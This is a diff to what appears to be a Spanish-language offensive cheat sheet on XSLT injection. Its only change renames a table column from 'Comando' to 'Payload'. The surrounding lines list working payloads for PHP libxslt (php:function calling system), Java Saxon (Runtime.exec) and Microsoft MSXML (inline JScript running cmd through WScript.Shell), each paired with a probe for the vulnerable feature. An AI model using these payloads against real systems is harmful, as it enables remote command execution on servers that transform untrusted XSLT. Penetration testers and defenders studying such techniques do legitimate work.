@@ -23,7 +23,7 @@ Workflow: el payload XSLT se envía como cuerpo de la request `curl -X POST -H "
 
 ## PHP / libxslt
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<xsl:value-of select="function-available('php:function')"/>` con `xmlns:php="http://php.net/xsl"` | Detect `registerPHPFunctions()` active | Pre-attack probe. |
 | `<xsl:value-of select="php:function('system','id')"/>` | RCE basic system('id') | Standard PHP RCE. |
@@ -51,7 +51,7 @@ echo $xsl->transformToXML(new DOMDocument());
 
 ## Java / Saxon
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<xsl:value-of select="function-available('saxon:evaluate')"/>` con `xmlns:Runtime="java:java.lang.Runtime"` | Detect Saxon-PE/EE (saxon:evaluate available) | Pre-attack. |
 | `<xsl:variable name="rt" select="Runtime:getRuntime()"/><xsl:variable name="proc" select="Runtime:exec($rt, 'id')"/>` con `xmlns:Runtime="java:java.lang.Runtime"` | Runtime command execution basic id | Basic Saxon. |
@@ -89,7 +89,7 @@ echo $xsl->transformToXML(new DOMDocument());
 
 ## Microsoft / MSXML
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<xsl:value-of select="function-available('msxsl:script')"/>` con `xmlns:msxsl="urn:schemas-microsoft-com:xslt"` | Detect msxsl:script availability | Pre-attack. |
 | `<msxsl:script language="JScript" implements-prefix="ext"><![CDATA[function r(c){var s=new ActiveXObject("WScript.Shell");return s.Exec("cmd /c "+c).StdOut.ReadAll()}]]></msxsl:script><xsl:value-of select="ext:r('whoami')"/>` | Inline JScript ActiveX shell run | Inline JScript. |
